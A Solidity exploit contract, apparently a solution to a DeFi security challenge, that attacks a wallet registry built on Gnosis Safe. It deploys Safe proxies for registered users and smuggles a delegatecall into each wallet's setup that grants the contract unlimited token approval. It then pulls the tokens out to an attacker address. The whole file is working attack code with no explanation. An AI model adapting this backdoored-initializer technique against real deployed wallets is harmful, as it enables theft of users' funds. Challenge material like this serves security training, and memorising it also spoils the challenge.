import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract WalletRegistryExp {

    address walletRegistry;
    address masterCopy;
    constructor(address _masterCopy, address _walletRegistry) {
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
    }

    function attack(address token, address spender ) external {
        ERC20(token).approve(spender, type(uint256).max);
    }

    function initAttack(address token, address attacker ,address factory, address[] calldata users) external{       
        for (uint i=0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", 
                owners,
                uint256(1),
                address(this), // to
                abi.encodeWithSignature("attack(address,address)", token, address(this)),
                address(0x00),
                address(0x00),
                uint256(0),
                address(0x00)
            );
            address proxy = address(GnosisSafeProxyFactory(factory).createProxyWithCallback(masterCopy, initializer, 0x00, IProxyCreationCallback(walletRegistry)));
            ERC20(token).transferFrom(proxy,attacker, 10 ether);
        }
    }
}